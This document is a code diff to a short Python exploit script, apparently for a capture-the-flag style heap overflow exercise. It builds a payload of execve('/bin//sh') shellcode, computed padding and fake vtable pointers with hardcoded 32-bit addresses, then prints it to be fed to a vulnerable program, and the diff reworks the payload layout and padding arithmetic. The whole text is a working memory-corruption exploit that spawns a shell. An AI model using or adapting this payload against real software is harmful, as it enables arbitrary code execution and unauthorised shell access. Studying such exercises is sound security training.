@@ -1,3 +1,6 @@
+# Contains the address of the shellcode (a->_annotation + 4)
+VTABLE_0 = b"\x10\xa0\x04\x08"
+
 # Shellcode without '\n' or '\0' that executes 'execve("/bin//sh", NULL, NULL)'
 SHELLCODE = (
     b"\x31\xc0"  # xor eax, eax
@@ -11,15 +14,15 @@ SHELLCODE = (
     + b"\xcd\x80"  # int 0x80 (syscall)
 )
 
-ASTR_FILLER = b"A" * (100 - len(SHELLCODE))
+ANNOTATION_SIZE = 100
+VALUE_SIZE = 4
+MALLOC_HEADER_SIZE = 4  # only 4 instead of 8 since previous chunk is in use
+PADDING_SIZE = (
+    ANNOTATION_SIZE + VALUE_SIZE + MALLOC_HEADER_SIZE - len(VTABLE_0) - len(SHELLCODE)
+)
+PADDING = b"A" * PADDING_SIZE
 
-AVAL_FILLER = b"B" * 4
+# Contains the address of a->_annotation
+VTABLE = b"\x0c\xa0\x04\x08"
 
-# only 4 bytes instead of 8 because the previous chunk is used
-VTABLE_0 = b"\x0c\xa0\x04\x08"  # contains the address of a->_annotation (our shellcode)
-
-VTABLE = b"\x74\xa0\x04\x08"  # contains the address of b's malloc header
-
-EXPLOIT = SHELLCODE + ASTR_FILLER + AVAL_FILLER + VTABLE_0 + VTABLE
-
-print(EXPLOIT)
+print(VTABLE_0 + SHELLCODE + PADDING + VTABLE)
